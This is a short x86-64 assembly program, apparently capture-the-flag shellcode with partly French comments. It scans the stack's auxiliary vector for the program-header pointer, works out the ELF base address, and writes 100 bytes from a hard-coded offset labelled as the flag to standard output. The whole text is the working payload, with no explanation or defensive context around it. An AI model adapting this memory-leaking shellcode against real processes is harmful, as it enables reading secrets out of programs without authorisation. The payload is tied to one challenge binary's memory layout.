bits 64
_start:
    mov rbx, rsp
    mov r12, 0x4000          ; limite de scan
.scan:
    mov rax, [rbx]
    cmp rax, 3               ; AT_PHDR
    jne .next
    mov rcx, [rbx+8]
    sub rcx, 0x40            ; candidate base
    mov eax, [rcx]
    cmp eax, 0x464c457f      ; "\x7fELF"
    je .found
.next:
    add rbx, 16
    dec r12
    jnz .scan
    mov rax, 60              ; exit
    mov rdi, 0
    syscall
.found:
    lea rsi, [rcx+0x202060]  ; &flag
    mov rax, 1               ; write
    mov rdi, 1
    mov rdx, 100
    syscall
    mov rax, 60
    xor rdi, rdi
    syscall
